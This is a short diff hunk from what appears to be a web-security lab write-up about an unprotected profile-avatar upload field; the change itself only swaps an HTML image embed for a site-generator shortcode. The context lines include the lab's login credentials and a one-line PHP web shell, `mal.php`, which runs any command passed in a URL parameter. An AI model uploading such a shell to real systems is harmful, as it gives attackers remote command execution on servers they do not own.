@@ -10,7 +10,7 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 So this application has an unprotected upload field in user page where you can upload profile avatar.
 
-<figure><img src="/.gitbook/assets/Pasted image 20240719131804.png" alt=""><figcaption><p>unprotected file upload</p></figcaption></figure>
+{{< figure src="/.gitbook/assets/Pasted image 20240719131804.png" alt="" >}}
 
 From there, I effectively uploaded a file named `mal.php` with contents `<?php echo system($_GET['command']); ?>`
 
